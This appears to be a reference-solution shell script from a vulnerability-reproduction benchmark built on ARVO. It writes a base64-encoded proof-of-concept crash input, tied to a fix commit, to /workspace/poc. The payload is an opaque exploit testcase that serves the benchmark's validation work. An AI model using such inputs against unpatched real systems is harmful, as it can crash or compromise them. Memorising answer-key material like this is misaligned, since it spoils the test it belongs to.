#!/bin/bash
# Reference solution: materialize the known-good PoC (the ARVO testcase the
# fix commit c0572443 addresses) at /workspace/poc — the 'oracle passes' side of
# the bidirectional validation. (Does NOT build; grading runs on the oracle's
# untouched images, so this is level-independent.)
set -euo pipefail

mkdir -p /workspace
base64 -d > /workspace/poc <<'B64'
cP+9vb29vb06OrAAa1S/AAAAAAAAAAAIcCoxAAAB////BwcBZmABJcN+ST2GQ29BizovL35JAMH/DhgYGBgAAAAAAAAAAAAAABgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBjhQEBAQEBAQEBAQEBAQEBAQOf/////54FJPYZDVUF/Oi8vfkkAwf8OGBgYGAAHPgAAAAAQAQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdGBhgGBgYGBgYGBgYGBgYGBgYGBgYGBgYAAAAAAAAAAAAAAAAABgYNDc5ODE2l5eXl5eXl5eXl5eXlzc2GAABCzA=
B64

echo "wrote $(wc -c < /workspace/poc) bytes to /workspace/poc"
